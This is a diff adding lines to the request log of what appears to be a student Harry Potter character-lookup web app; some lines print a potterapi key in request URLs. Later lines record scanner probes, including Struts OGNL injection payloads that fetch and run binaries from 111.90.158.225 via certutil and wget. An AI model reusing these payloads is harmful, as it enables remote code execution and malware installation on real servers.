@@ -946,3 +946,1050 @@ collection removed
 [0mGET /favicon.ico [33m404 [0m1.192 ms - 1642[0m
 [0mGET / [36m304 [0m0.462 ms - -[0m
 [0mGET /harryStyles.css [36m304 [0m0.318 ms - -[0m
+[0mGET / [32m200 [0m0.630 ms - 1455[0m
+[0mGET / [32m200 [0m1.576 ms - 1455[0m
+[0mGET /harryStyles.css [32m200 [0m0.514 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.423 ms - 3853[0m
+[0mGET /favicon.ico [33m404 [0m0.887 ms - 1642[0m
+https://www.potterapi.com/v1/characters?name=Harry&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[]
+[0mGET /character/Harry [32m200 [0m159.663 ms - 2[0m
+in getHistory POST route
+{ characterName: 'Harry' }
+{ _id: 5bedc92be3d32b7d767756f5, characterName: 'Harry' }
+{ _id: 5bedc92be3d32b7d767756f5, characterName: 'Harry', __v: 0 }
+[0mPOST /getHistory [32m200 [0m2.238 ms - 2[0m
+https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[ { _id: '5a12292a0f5ae10021650d7e',
+    name: 'Harry Potter',
+    role: 'student',
+    house: 'Gryffindor',
+    school: 'Hogwarts School of Witchcraft and Wizardry',
+    alias: 'The Boy Who Lived',
+    wand: 'Holly, 11", phoenix feather',
+    boggart: 'dementor',
+    patronus: 'stag',
+    __v: 0,
+    ministryOfMagic: false,
+    orderOfThePhoenix: true,
+    dumbledoresArmy: true,
+    deathEater: false,
+    bloodStatus: 'half-blood',
+    species: 'human' } ]
+[0mGET /character/Harry%20Potter [32m200 [0m83.056 ms - 399[0m
+in getHistory POST route
+{ characterName: 'Harry Potter' }
+{ _id: 5bedc930e3d32b7d767756f6, characterName: 'Harry Potter' }
+{ _id: 5bedc930e3d32b7d767756f6,
+  characterName: 'Harry Potter',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m2.594 ms - 2[0m
+[0mGET /getHistory [32m200 [0m1.756 ms - 142[0m
+In the DELETE route?
+[0mPOST /delete [32m200 [0m0.445 ms - 2[0m
+collection removed
+[0mGET /? [32m200 [0m0.503 ms - 1455[0m
+[0mGET /harryStyles.css [36m304 [0m0.320 ms - -[0m
+[0mGET /harryJS.js [36m304 [0m0.286 ms - -[0m
+[0mGET / [32m200 [0m0.684 ms - 1455[0m
+[0mGET / [32m200 [0m0.608 ms - 1455[0m
+[0mGET /harryStyles.css [32m200 [0m0.492 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.485 ms - 3853[0m
+[0mGET /favicon.ico [33m404 [0m0.900 ms - 1642[0m
+[0mGET /getHistory [32m200 [0m1.382 ms - 2[0m
+In the DELETE route?
+[0mPOST /delete [32m200 [0m0.361 ms - 2[0m
+collection removed
+[0mGET /? [32m200 [0m3.852 ms - 1455[0m
+[0mGET /harryStyles.css [36m304 [0m0.498 ms - -[0m
+[0mGET /harryJS.js [36m304 [0m0.481 ms - -[0m
+[0mGET /getHistory [36m304 [0m1.351 ms - -[0m
+In the DELETE route?
+[0mPOST /delete [32m200 [0m0.382 ms - 2[0m
+collection removed
+[0mGET /? [36m304 [0m0.388 ms - -[0m
+[0mGET /harryJS.js [36m304 [0m0.472 ms - -[0m
+[0mGET /harryStyles.css [36m304 [0m0.520 ms - -[0m
+[0mGET / [32m200 [0m0.610 ms - 1455[0m
+[0mGET / [32m200 [0m3.383 ms - 1455[0m
+[0mGET / [32m200 [0m1.103 ms - 1455[0m
+[0mGET / [32m200 [0m0.566 ms - 1455[0m
+[0mGET / [32m200 [0m0.605 ms - 1455[0m
+[0mGET / [32m200 [0m0.633 ms - 1455[0m
+[0mGET / [32m200 [0m0.616 ms - 1455[0m
+[0mGET / [32m200 [0m0.686 ms - 1455[0m
+[0mGET /harryStyles.css [32m200 [0m0.474 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.448 ms - 3853[0m
+[0mGET /favicon.ico [33m404 [0m0.879 ms - 1642[0m
+[0mGET / [32m200 [0m0.686 ms - 1455[0m
+[0mGET /harryStyles.css [32m200 [0m0.457 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.453 ms - 3853[0m
+[0mGET /favicon.ico [33m404 [0m0.884 ms - 1642[0m
+[0mGET /getHistory [32m200 [0m1.401 ms - 2[0m
+[0mGET /character/ [33m404 [0m1.613 ms - 1642[0m
+In the DELETE route?
+[0mPOST /delete [32m200 [0m0.841 ms - 2[0m
+collection removed
+[0mGET /? [32m200 [0m0.513 ms - 1455[0m
+[0mGET /harryStyles.css [36m304 [0m0.713 ms - -[0m
+[0mGET /harryJS.js [36m304 [0m0.197 ms - -[0m
+[0mGET / [32m200 [0m0.615 ms - 1455[0m
+[0mGET / [32m200 [0m0.629 ms - 1455[0m
+[0mGET / [32m200 [0m0.606 ms - 1455[0m
+[0mGET / [32m200 [0m0.560 ms - 1455[0m
+[0mGET /harryStyles.css [32m200 [0m0.467 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.457 ms - 3853[0m
+[0mGET /favicon.ico [33m404 [0m0.868 ms - 1642[0m
+https://www.potterapi.com/v1/characters?name=Harry&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[]
+[0mGET /character/Harry [32m200 [0m292.862 ms - 2[0m
+in getHistory POST route
+{ characterName: 'harry' }
+{ _id: 5bee32e5e3d32b7d767756f7, characterName: 'harry' }
+{ _id: 5bee32e5e3d32b7d767756f7, characterName: 'harry', __v: 0 }
+[0mPOST /getHistory [32m200 [0m2.187 ms - 2[0m
+https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[ { _id: '5a12292a0f5ae10021650d7e',
+    name: 'Harry Potter',
+    role: 'student',
+    house: 'Gryffindor',
+    school: 'Hogwarts School of Witchcraft and Wizardry',
+    alias: 'The Boy Who Lived',
+    wand: 'Holly, 11", phoenix feather',
+    boggart: 'dementor',
+    patronus: 'stag',
+    __v: 0,
+    ministryOfMagic: false,
+    orderOfThePhoenix: true,
+    dumbledoresArmy: true,
+    deathEater: false,
+    bloodStatus: 'half-blood',
+    species: 'human' } ]
+[0mGET /character/Harry%20Potter [32m200 [0m89.448 ms - 399[0m
+in getHistory POST route
+{ characterName: 'Harry Potter' }
+{ _id: 5bee32eee3d32b7d767756f8, characterName: 'Harry Potter' }
+{ _id: 5bee32eee3d32b7d767756f8,
+  characterName: 'Harry Potter',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m2.015 ms - 2[0m
+[0mGET /getHistory [32m200 [0m1.728 ms - 142[0m
+https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[ { _id: '5a12292a0f5ae10021650d7e',
+    name: 'Harry Potter',
+    role: 'student',
+    house: 'Gryffindor',
+    school: 'Hogwarts School of Witchcraft and Wizardry',
+    alias: 'The Boy Who Lived',
+    wand: 'Holly, 11", phoenix feather',
+    boggart: 'dementor',
+    patronus: 'stag',
+    __v: 0,
+    ministryOfMagic: false,
+    orderOfThePhoenix: true,
+    dumbledoresArmy: true,
+    deathEater: false,
+    bloodStatus: 'half-blood',
+    species: 'human' } ]
+[0mGET /character/Harry%20Potter [36m304 [0m84.832 ms - -[0m
+in getHistory POST route
+{ characterName: 'Harry Potter' }
+{ _id: 5bee32f9e3d32b7d767756f9, characterName: 'Harry Potter' }
+{ _id: 5bee32f9e3d32b7d767756f9,
+  characterName: 'Harry Potter',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m1.838 ms - 2[0m
+[0mGET / [32m200 [0m0.599 ms - 1455[0m
+[0mGET /harryStyles.css [32m200 [0m0.455 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.463 ms - 3853[0m
+[0mGET /favicon.ico [33m404 [0m0.852 ms - 1642[0m
+[0mGET / [32m200 [0m0.654 ms - 1455[0m
+[0mGET / [32m200 [0m0.659 ms - 1455[0m
+[0mGET / [32m200 [0m0.610 ms - 1455[0m
+[0mGET / [32m200 [0m0.644 ms - 1455[0m
+[0mGET / [32m200 [0m1.077 ms - 1455[0m
+[0mGET / [32m200 [0m0.609 ms - 1455[0m
+[0mGET / [36m304 [0m0.435 ms - -[0m
+[0mGET /harryStyles.css [36m304 [0m0.304 ms - -[0m
+[0mGET /harryJS.js [36m304 [0m0.239 ms - -[0m
+[0mGET /favicon.ico [33m404 [0m1.396 ms - 1642[0m
+[0mGET / [32m200 [0m0.621 ms - 1455[0m
+[0mGET / [32m200 [0m0.621 ms - 1455[0m
+[0mGET / [32m200 [0m0.560 ms - 1455[0m
+[0mGET /harryStyles.css [32m200 [0m0.534 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.443 ms - 3853[0m
+[0mGET /favicon.ico [33m404 [0m0.841 ms - 1642[0m
+[0mGET / [32m200 [0m0.629 ms - 1455[0m
+[0mGET / [32m200 [0m0.644 ms - 1455[0m
+[0mGET / [32m200 [0m0.600 ms - 1455[0m
+[0mGET / [32m200 [0m0.742 ms - 1455[0m
+[0mGET / [32m200 [0m0.606 ms - 1455[0m
+[0mGET / [32m200 [0m0.640 ms - 1455[0m
+[0mGET / [32m200 [0m0.876 ms - 1455[0m
+[0mGET / [32m200 [0m0.643 ms - 1455[0m
+[0mGET / [32m200 [0m0.604 ms - 1455[0m
+[0mGET / [32m200 [0m0.637 ms - 1455[0m
+[0mGET / [32m200 [0m0.628 ms - 1455[0m
+[0mGET / [32m200 [0m3.818 ms - 1455[0m
+[0mGET / [32m200 [0m0.597 ms - 1455[0m
+[0mGET / [32m200 [0m0.617 ms - 1455[0m
+[0mGET / [32m200 [0m0.567 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.870 ms - 1642[0m
+[0mGET / [32m200 [0m0.658 ms - 1455[0m
+[0mGET / [32m200 [0m0.622 ms - 1455[0m
+[0mGET / [32m200 [0m1.934 ms - 1455[0m
+[0mGET / [32m200 [0m0.699 ms - 1455[0m
+[0mGET / [32m200 [0m3.791 ms - 1455[0m
+[0mGET / [32m200 [0m0.605 ms - 1455[0m
+[0mGET /harryStyles.css [32m200 [0m0.457 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.439 ms - 3853[0m
+[0mGET /favicon.ico [33m404 [0m0.854 ms - 1642[0m
+[0mGET / [32m200 [0m0.602 ms - 1455[0m
+[0mGET / [32m200 [0m0.569 ms - 1455[0m
+[0mGET /harryStyles.css [32m200 [0m0.557 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.405 ms - 3853[0m
+[0mGET /favicon.ico [33m404 [0m0.890 ms - 1642[0m
+[0mGET / [32m200 [0m0.597 ms - 1455[0m
+[0mGET /harryStyles.css [32m200 [0m0.456 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.491 ms - 3853[0m
+[0mGET /favicon.ico [33m404 [0m2.377 ms - 1642[0m
+[0mGET / [32m200 [0m1.016 ms - 1455[0m
+[0mGET / [32m200 [0m1.552 ms - 1455[0m
+[0mGET / [32m200 [0m0.641 ms - 1455[0m
+[0mGET / [32m200 [0m0.678 ms - 1455[0m
+[0mGET / [32m200 [0m1.418 ms - 1455[0m
+[0mGET / [32m200 [0m0.637 ms - 1455[0m
+[0mGET / [32m200 [0m0.589 ms - 1455[0m
+[0mGET / [32m200 [0m0.980 ms - 1455[0m
+[0mGET / [32m200 [0m0.626 ms - 1455[0m
+[0mGET / [32m200 [0m0.647 ms - 1455[0m
+[0mGET / [32m200 [0m0.634 ms - 1455[0m
+[0mGET / [32m200 [0m0.596 ms - 1455[0m
+[0mGET / [32m200 [0m0.624 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.604 ms - 1455[0m
+[0mGET / [32m200 [0m0.616 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m4.153 ms - 1455[0m
+[0mGET / [32m200 [0m1.216 ms - 1455[0m
+[0mGET / [32m200 [0m1.228 ms - 1455[0m
+[0mGET / [32m200 [0m0.613 ms - 1455[0m
+[0mGET / [32m200 [0m0.580 ms - 1455[0m
+[0mGET / [32m200 [0m1.099 ms - 1455[0m
+[0mGET / [32m200 [0m0.572 ms - 1455[0m
+[0mGET / [32m200 [0m0.626 ms - 1455[0m
+[0mGET / [32m200 [0m0.622 ms - 1455[0m
+[0mGET / [32m200 [0m0.655 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.868 ms - 1642[0m
+[0mGET / [32m200 [0m0.602 ms - 1455[0m
+[0mGET / [32m200 [0m1.057 ms - 1455[0m
+[0mGET / [32m200 [0m0.604 ms - 1455[0m
+[0mGET / [32m200 [0m0.595 ms - 1455[0m
+[0mGET / [32m200 [0m0.642 ms - 1455[0m
+[0mGET / [32m200 [0m0.591 ms - 1455[0m
+[0mGET / [32m200 [0m0.602 ms - 1455[0m
+[0mGET / [32m200 [0m0.485 ms - 1455[0m
+[0mGET / [32m200 [0m0.618 ms - 1455[0m
+[0mGET / [32m200 [0m0.674 ms - 1455[0m
+[0mGET / [32m200 [0m1.100 ms - 1455[0m
+[0mPOST /tmUnblock.cgi [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m0.653 ms - 1455[0m
+[0mGET / [32m200 [0m1.655 ms - 1455[0m
+[0mGET / [32m200 [0m0.618 ms - 1455[0m
+[0mGET / [32m200 [0m0.538 ms - 1455[0m
+[0mGET /robots.txt [33m404 [0m0.833 ms - 1642[0m
+[0mGET /sitemap.xml [33m404 [0m0.864 ms - 1642[0m
+[0mGET /.well-known/security.txt [33m404 [0m1.734 ms - 1642[0m
+[0mGET /favicon.ico [33m404 [0m0.852 ms - 1642[0m
+[0mGET / [32m200 [0m0.654 ms - 1455[0m
+[0mGET / [32m200 [0m0.575 ms - 1455[0m
+[0mGET / [32m200 [0m0.582 ms - 1455[0m
+[0mPOST /phpmyadmin/index.php [33m404 [0m1.671 ms - 1637[0m
+[0mGET / [32m200 [0m0.599 ms - 1455[0m
+[0mGET / [32m200 [0m0.572 ms - 1455[0m
+[0mGET / [32m200 [0m0.625 ms - 1455[0m
+[0mGET / [32m200 [0m0.591 ms - 1455[0m
+[0mGET / [32m200 [0m0.580 ms - 1455[0m
+[0mGET / [32m200 [0m0.629 ms - 1455[0m
+[0mPOST /phpmyadmin/index.php [33m404 [0m0.940 ms - 1637[0m
+[0mGET / [36m304 [0m0.450 ms - -[0m
+[0mGET /harryStyles.css [36m304 [0m0.306 ms - -[0m
+[0mGET /harryJS.js [36m304 [0m0.316 ms - -[0m
+[0mGET / [32m200 [0m0.647 ms - 1455[0m
+[0mGET / [32m200 [0m0.594 ms - 1455[0m
+[0mGET / [32m200 [0m0.623 ms - 1455[0m
+[0mGET / [32m200 [0m0.575 ms - 1455[0m
+[0mGET / [32m200 [0m0.593 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m0.606 ms - 1455[0m
+[0mGET / [32m200 [0m0.562 ms - 1455[0m
+[0mGET / [32m200 [0m0.631 ms - 1455[0m
+[0mGET / [32m200 [0m0.657 ms - 1455[0m
+[0mGET / [32m200 [0m0.596 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m3.409 ms - 1642[0m
+[0mGET / [32m200 [0m0.633 ms - 1455[0m
+[0mGET / [32m200 [0m1.109 ms - 1455[0m
+[0mGET / [32m200 [0m0.584 ms - 1455[0m
+[0mGET /ws_utc/resources/setting/options/general [33m404 [0m0.827 ms - 1642[0m
+[0mPOST / [33m404 [0m1.082 ms - 1637[0m
+[0mPOST / [33m404 [0m0.685 ms - 1637[0m
+[0mPOST / [33m404 [0m0.739 ms - 1637[0m
+[0mPOST / [33m404 [0m0.703 ms - 1637[0m
+[0mGET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action [33m404 [0m2.601 ms - 1642[0m
+[0mGET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action [33m404 [0m0.845 ms - 1642[0m
+[0mGET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action [33m404 [0m0.893 ms - 1642[0m
+[0mGET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action [33m404 [0m0.860 ms - 1642[0m
+[0mGET /invoker/readonly [33m404 [0m0.802 ms - 1642[0m
+[0mGET /invoker/JMXInvokerServlet [33m404 [0m0.808 ms - 1642[0m
+[0mGET /jmx-console/HtmlAdaptor [33m404 [0m1.421 ms - 1642[0m
+[0mGET /orders.xhtml [33m404 [0m0.789 ms - 1642[0m
+[0mGET / [32m200 [0m0.574 ms - 1455[0m
+[0mGET /users [32m200 [0m0.543 ms - 23[0m
+[0mPUT /dbe_put1.jsp/ [33m404 [0m134.662 ms - 1637[0m
+[0mGET /dbe_put1.jsp [33m404 [0m0.846 ms - 1642[0m
+[0mGET /manager/html [33m404 [0m0.887 ms - 1642[0m
+[0mGET /wls-wsat/CoordinatorPortType [33m404 [0m0.829 ms - 1642[0m
+[0mGET / [32m200 [0m0.626 ms - 1455[0m
+[0mGET / [32m200 [0m0.612 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m0.607 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.622 ms - 1455[0m
+[0mGET / [32m200 [0m1.180 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.909 ms - 1642[0m
+[0mGET / [32m200 [0m2.760 ms - 1455[0m
+[0mGET / [32m200 [0m0.580 ms - 1455[0m
+[0mGET / [32m200 [0m0.546 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.825 ms - 1642[0m
+[0mGET / [32m200 [0m0.614 ms - 1455[0m
+[0mGET / [32m200 [0m0.618 ms - 1455[0m
+[0mGET / [32m200 [0m1.247 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.628 ms - 1455[0m
+[0mGET / [32m200 [0m0.582 ms - 1455[0m
+[0mGET / [32m200 [0m0.609 ms - 1455[0m
+[0mGET / [32m200 [0m0.598 ms - 1455[0m
+[0mGET / [32m200 [0m0.598 ms - 1455[0m
+[0mGET / [32m200 [0m0.583 ms - 1455[0m
+[0mGET / [32m200 [0m0.545 ms - 1455[0m
+[0mGET / [32m200 [0m0.593 ms - 1455[0m
+[0mGET / [32m200 [0m0.554 ms - 1455[0m
+[0mGET / [32m200 [0m0.540 ms - 1455[0m
+[0mGET / [32m200 [0m0.621 ms - 1455[0m
+[0mGET / [32m200 [0m1.517 ms - 1455[0m
+[0mGET / [32m200 [0m1.102 ms - 1455[0m
+[0mGET / [32m200 [0m0.570 ms - 1455[0m
+[0mGET / [32m200 [0m0.594 ms - 1455[0m
+[0mGET / [32m200 [0m0.583 ms - 1455[0m
+[0mGET / [32m200 [0m0.611 ms - 1455[0m
+[0mGET / [32m200 [0m0.657 ms - 1455[0m
+[0mGET / [32m200 [0m0.597 ms - 1455[0m
+[0mGET / [32m200 [0m1.611 ms - 1455[0m
+[0mGET / [32m200 [0m0.499 ms - 1455[0m
+[0mGET / [32m200 [0m0.609 ms - 1455[0m
+[0mGET / [32m200 [0m0.607 ms - 1455[0m
+[0mGET / [32m200 [0m1.330 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.599 ms - 1455[0m
+[0mGET / [32m200 [0m0.619 ms - 1455[0m
+[0mGET / [32m200 [0m2.582 ms - 1455[0m
+[0mGET / [32m200 [0m0.573 ms - 1455[0m
+[0mGET / [32m200 [0m0.626 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m0.609 ms - 1455[0m
+[0mGET / [32m200 [0m0.581 ms - 1455[0m
+[0mGET / [32m200 [0m0.578 ms - 1455[0m
+[0mGET / [32m200 [0m0.639 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m0.587 ms - 1455[0m
+[0mGET / [32m200 [0m0.601 ms - 1455[0m
+[0mGET / [32m200 [0m0.694 ms - 1455[0m
+[0mGET / [32m200 [0m0.631 ms - 1455[0m
+[0mGET / [32m200 [0m0.626 ms - 1455[0m
+[0mGET / [32m200 [0m0.586 ms - 1455[0m
+[0mGET /admin/connection/ [33m404 [0m0.860 ms - 1642[0m
+[0mGET / [32m200 [0m0.605 ms - 1455[0m
+[0mGET /home.asp [33m404 [0m0.853 ms - 1642[0m
+[0mGET / [32m200 [0m0.624 ms - 1455[0m
+[0mGET / [32m200 [0m0.560 ms - 1455[0m
+[0mGET / [32m200 [0m0.564 ms - 1455[0m
+[0mGET / [32m200 [0m0.647 ms - 1455[0m
+[0mGET / [32m200 [0m0.551 ms - 1455[0m
+[0mGET / [32m200 [0m0.953 ms - 1455[0m
+[0mGET http://179.55.191.220:8269/o8s1jrwjovi29 [33m404 [0m0.869 ms - 1642[0m
+[0mGET / [32m200 [0m0.636 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m0.600 ms - 1455[0m
+[0mGET / [32m200 [0m0.598 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.830 ms - 1642[0m
+[0mGET / [32m200 [0m0.617 ms - 1455[0m
+[0mGET / [32m200 [0m2.230 ms - 1455[0m
+[0mGET / [32m200 [0m0.589 ms - 1455[0m
+[0mGET / [32m200 [0m2.715 ms - 1455[0m
+[0mGET / [32m200 [0m0.464 ms - 1455[0m
+[0mGET / [32m200 [0m0.559 ms - 1455[0m
+[0mGET / [32m200 [0m0.589 ms - 1455[0m
+[0mGET / [32m200 [0m0.666 ms - 1455[0m
+[0mGET / [32m200 [0m0.647 ms - 1455[0m
+[0mGET / [32m200 [0m0.635 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.933 ms - 1642[0m
+[0mGET / [32m200 [0m0.553 ms - 1455[0m
+[0mGET / [32m200 [0m0.604 ms - 1455[0m
+[0mGET / [32m200 [0m0.637 ms - 1455[0m
+[0mGET / [32m200 [0m1.079 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m0.604 ms - 1455[0m
+[0mGET / [32m200 [0m0.617 ms - 1455[0m
+[0mGET / [32m200 [0m0.571 ms - 1455[0m
+[0mGET / [32m200 [0m0.635 ms - 1455[0m
+[0mGET / [32m200 [0m0.568 ms - 1455[0m
+[0mGET / [32m200 [0m0.576 ms - 1455[0m
+[0mGET / [32m200 [0m1.155 ms - 1455[0m
+[0mGET / [32m200 [0m0.593 ms - 1455[0m
+[0mGET / [32m200 [0m0.599 ms - 1455[0m
+[0mGET / [32m200 [0m0.633 ms - 1455[0m
+[0mGET / [32m200 [0m0.572 ms - 1455[0m
+[0mGET / [32m200 [0m0.617 ms - 1455[0m
+[0mGET / [32m200 [0m0.660 ms - 1455[0m
+[0mGET / [32m200 [0m0.631 ms - 1455[0m
+[0mGET / [32m200 [0m0.600 ms - 1455[0m
+[0mGET / [32m200 [0m0.625 ms - 1455[0m
+[0mPOST /tmUnblock.cgi [33m404 [0m5.652 ms - 1637[0m
+[0mGET /tmUnblock.cgi [33m404 [0m0.810 ms - 1642[0m
+[0mGET http://journalseek.net/ [32m200 [0m0.607 ms - 1455[0m
+[0mGET / [32m200 [0m0.668 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.777 ms - 1642[0m
+[0mGET / [32m200 [0m0.631 ms - 1455[0m
+[0mGET / [32m200 [0m0.655 ms - 1455[0m
+[0mGET / [32m200 [0m0.614 ms - 1455[0m
+[0mGET / [32m200 [0m2.946 ms - 1455[0m
+[0mGET http://www.pnas.org/ [32m200 [0m0.560 ms - 1455[0m
+[0mGET / [32m200 [0m0.591 ms - 1455[0m
+[0mGET / [32m200 [0m0.609 ms - 1455[0m
+[0mGET / [32m200 [0m0.478 ms - 1455[0m
+[0mGET / [32m200 [0m0.555 ms - 1455[0m
+[0mGET / [32m200 [0m0.679 ms - 1455[0m
+[0mGET / [32m200 [0m0.597 ms - 1455[0m
+[0mGET / [32m200 [0m0.579 ms - 1455[0m
+[0mGET / [32m200 [0m0.569 ms - 1455[0m
+[0mGET / [32m200 [0m0.578 ms - 1455[0m
+[0mGET / [32m200 [0m0.591 ms - 1455[0m
+[0mGET / [32m200 [0m0.584 ms - 1455[0m
+[0mGET / [32m200 [0m0.595 ms - 1455[0m
+[0mGET / [32m200 [0m0.589 ms - 1455[0m
+[0mGET / [32m200 [0m0.775 ms - 1455[0m
+[0mGET / [32m200 [0m0.624 ms - 1455[0m
+[0mGET / [32m200 [0m0.578 ms - 1455[0m
+[0mGET / [32m200 [0m0.604 ms - 1455[0m
+[0mGET / [32m200 [0m0.611 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m0.584 ms - 1455[0m
+[0mGET / [32m200 [0m0.617 ms - 1455[0m
+[0mGET / [32m200 [0m0.567 ms - 1455[0m
+[0mGET / [32m200 [0m0.630 ms - 1455[0m
+[0mGET / [32m200 [0m0.601 ms - 1455[0m
+[0mGET / [32m200 [0m1.047 ms - 1455[0m
+[0mGET / [32m200 [0m0.708 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.573 ms - 1455[0m
+[0mGET / [32m200 [0m0.769 ms - 1455[0m
+[0mGET / [32m200 [0m4.534 ms - 1455[0m
+[0mGET / [32m200 [0m0.576 ms - 1455[0m
+[0mGET /RELEASE-NOTES.txt [33m404 [0m0.818 ms - 1642[0m
+[0mGET / [32m200 [0m4.000 ms - 1455[0m
+[0mGET / [32m200 [0m0.578 ms - 1455[0m
+[0mGET / [32m200 [0m0.563 ms - 1455[0m
+[0mGET / [32m200 [0m0.605 ms - 1455[0m
+[0mGET / [32m200 [0m0.565 ms - 1455[0m
+[0mGET / [32m200 [0m0.569 ms - 1455[0m
